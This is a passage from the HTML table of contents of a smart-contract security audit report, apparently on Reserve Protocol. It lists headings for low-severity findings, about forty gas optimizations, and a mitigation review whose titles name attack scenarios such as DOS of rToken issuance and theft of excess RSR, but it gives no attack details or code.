href=\"#o-02-use-a-more-recent-pragma-version\">O-02 Use a more recent pragma version</a></li>\n<li><a href=\"#o-03-function-naming-suggestions\">O-03 Function Naming suggestions</a></li>\n<li><a href=\"#o-04-events-is-missing-indexed-fields\">O-04 Events is missing indexed fields</a></li>\n<li><a href=\"#o-05-proper-use-of-get-as-a-function-name-prefix\">O-05 Proper use of get as a function name prefix</a></li>\n<li><a href=\"#o-06-commented-out-code\">O-06 Commented out code</a></li>\n<li><a href=\"#o-07-value-should-be-unchecked\">O-07 Value should be unchecked</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#g01-dont-apply-the-same-value-to-state-variables\">G‑01 Don’t apply the same value to state variables</a></li>\n<li><a href=\"#g02-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">G‑02 Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</a></li>\n<li><a href=\"#g03-state-variables-only-set-in-the-constructor-should-be-declared-immutable\">G‑03 State variables only set in the constructor should be declared <code>immutable</code></a></li>\n<li><a href=\"#g04-state-variables-can-be-packed-into-fewer-storage-slots\">G‑04 State variables can be packed into fewer storage slots</a></li>\n<li><a href=\"#g05-structs-can-be-packed-into-fewer-storage-slots\">G‑05 Structs can be packed into fewer storage slots</a></li>\n<li><a href=\"#g06-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G‑06 Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</a></li>\n<li><a href=\"#g07-using-storage-instead-of-memory-for-structsarrays-saves-gas\">G‑07 Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</a></li>\n<li><a href=\"#g08-avoid-contract-existence-checks-by-using-low-level-calls\">G‑08 Avoid contract existence checks by using low level calls</a></li>\n<li><a href=\"#g09-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑09 State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g10-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">G‑10 Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#g11-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\">G‑11 The result of function calls should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g12-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G‑12 <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</a></li>\n<li><a href=\"#g13-internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑13 <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g14-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G‑14 Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</a></li>\n<li><a href=\"#g15-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\">G‑15 <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</a></li>\n<li><a href=\"#g16-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G‑16 <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g17-optimize-names-to-save-gas\">G‑17 Optimize names to save gas</a></li>\n<li><a href=\"#g18-use-a-more-recent-version-of-solidity\">G‑18 Use a more recent version of solidity</a></li>\n<li><a href=\"#g19-use-a-more-recent-version-of-solidity\">G‑19 Use a more recent version of solidity</a></li>\n<li><a href=\"#g20--costs-less-gas-than-\">G‑20 <code>>=</code> costs less gas than <code>></code></a></li>\n<li><a href=\"#g21-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\">G‑21 <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</a></li>\n<li><a href=\"#g22-splitting-require-statements-that-use--saves-gas\">G‑22 Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</a></li>\n<li><a href=\"#g23-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G‑23 Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g24-using-private-rather-than-public-for-constants-saves-gas\">G‑24 Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g25-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G‑25 <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#g26-empty-blocks-should-be-removed-or-emit-something\">G‑26 Empty blocks should be removed or emit something</a></li>\n<li><a href=\"#g27-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑27 Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g28-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑28 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#g29-dont-use-_msgsender-if-not-supporting-eip-2771\">G‑29 Don’t use <code>_msgSender()</code> if not supporting EIP-2771</a></li>\n<li><a href=\"#g30-public-functions-not-called-by-the-contract-should-be-declared-external-instead\">G‑30 <code>public</code> functions not called by the contract should be declared <code>external</code> instead</a></li>\n<li><a href=\"#excluded-findings\">Excluded findings</a></li>\n<li><a href=\"#g31-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\">G‑31 <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</a></li>\n<li><a href=\"#g32-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G‑32 <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g33-using-bools-for-storage-incurs-overhead\">G‑33 Using <code>bool</code>s for storage incurs overhead</a></li>\n<li><a href=\"#g34-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\">G‑34 Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</a></li>\n<li><a href=\"#g35-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\">G‑35 <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</a></li>\n<li><a href=\"#g36-using-private-rather-than-public-for-constants-saves-gas\">G‑36 Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g37-division-by-two-should-use-bit-shifting\">G‑37 Division by two should use bit shifting</a></li>\n<li><a href=\"#g38-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑38 Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g39-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑39 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#mitigation-review\">Mitigation Review</a></p>\n<ul>\n<li><a href=\"#introduction\">Introduction</a></li>\n<li><a href=\"#overview-of-changes\">Overview of Changes</a></li>\n<li><a href=\"#mitigation-review-scope\">Mitigation Review Scope</a></li>\n<li><a href=\"#mitigation-review-summary\">Mitigation Review Summary</a></li>\n<li><a href=\"#mitigation-of-h-02-issue-not-fully-mitigated\">Mitigation of H-02: Issue not fully mitigated</a></li>\n<li><a href=\"#mitigation-of-m-04-issue-not-fully-mitigated\">Mitigation of M-04: Issue not fully mitigated</a></li>\n<li><a href=\"#early-attacker-can-dos-rtoken-issuance\">Early attacker can DOS rToken issuance</a></li>\n<li><a href=\"#assetregistry-cannot-disable-a-bad-asset\">AssetRegistry cannot disable a bad asset</a></li>\n<li><a href=\"#strsr-attacker-can-steal-excess-rsr-that-is-returned-after-seizure\">StRSR: attacker can steal excess rsr that is returned after seizure</a></li>\n<li><a href=\"#attacker-can-temporary-deplete-available-redemptionissuance-by-running-issuance-then-redemption-or-vice-versa\">Attacker can temporary deplete available redemption/issuance by running issuance then redemption or vice versa</a></li>\n<li><a href=\"#attacker-can-cause-loss-to-rtoken-holders-and-stakers-by-running-backingmanager_managetokens-before-rewards-are-claimed\">Attacker can cause loss to rToken holders and stakers by running <code>BackingManager._manageTokens</code> before rewards are claimed</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}